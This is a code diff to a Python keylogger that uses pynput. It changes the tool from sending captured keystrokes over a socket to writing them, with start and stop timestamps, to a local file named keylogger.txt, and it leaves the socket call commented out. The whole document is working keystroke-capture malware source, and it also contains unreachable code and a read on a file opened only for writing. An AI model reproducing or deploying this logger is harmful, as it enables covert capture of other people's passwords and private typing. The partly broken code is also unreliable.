@@ -1,24 +1,29 @@
 from pynput import keyboard
 import time
+file=open("keylogger.txt","w")
 
-def run_on_press(key,sock):
+def run_on_press(key):
     character=str(key).replace("'","")
     if key==keyboard.Key.space:
-        sock.send_data(" ")
+        file.write(" ")
     if key==keyboard.Key.enter:
-        sock.send_data("\n")
+        file.write("\n")
     else:
-        sock.send_data(character)
-
-def exit_condition(key,sock):
+        file.write(character)
+def exit_condition(key):
     if key==keyboard.Key.esc:
         Time=time.ctime(time.time())
         footer="\n------------------\n" + "Time of termination: " + str(Time)
-        sock.send_data(footer)
-        
+        file.write(footer)
+        return
+        ans=file.read()
+        print(ans)
+
 def start_keylogger(sock):
     Time=time.ctime(time.time())
     header= "Time of initiation: " + str(Time) + "\n------------------\n"
-    sock.send_data(header)
+    file.write(header)
     with keyboard.Listener(on_press=run_on_press, on_release=exit_condition) as listener:
         listener.join()
+
+    # sock.send_data()
